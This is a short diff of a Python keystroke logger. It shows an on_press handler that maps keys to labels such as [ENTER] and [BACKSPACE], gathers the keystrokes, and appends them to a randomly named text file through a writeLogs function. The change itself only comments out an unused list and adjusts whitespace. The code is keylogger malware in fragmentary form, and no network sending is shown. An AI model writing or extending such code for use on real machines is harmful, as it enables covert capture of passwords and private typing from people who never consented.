@@ -7,12 +7,11 @@ import os
 
 chars = 0
 data = []
-kl = []
+#kl = []
 fileName = str(chars) + 'I' + str(random.randint(1000000, 9999999)) + '.txt'
 
-
 def on_press(key):
-    global kl
+    #global kl
     
     subs = ['Key.enter', ' [ENTER] ', 'Key.backspace', ' [BACKSPACE] ', 'Key.space', ' ',
             'Key.alt_l', ' [ALT] ', 'Key.tab', ' [TAB] ', 'Key.delete', ' [DEL] ', 'Key.ctrl_l', ' [CTRL] ',
@@ -30,7 +29,7 @@ def on_press(key):
     print("".join(data))
     writeLogs(0)
 
-    
+
 def writeLogs(chars):
     path = os.path.expandvars("temp")
     with open(fileName, "a") as f:
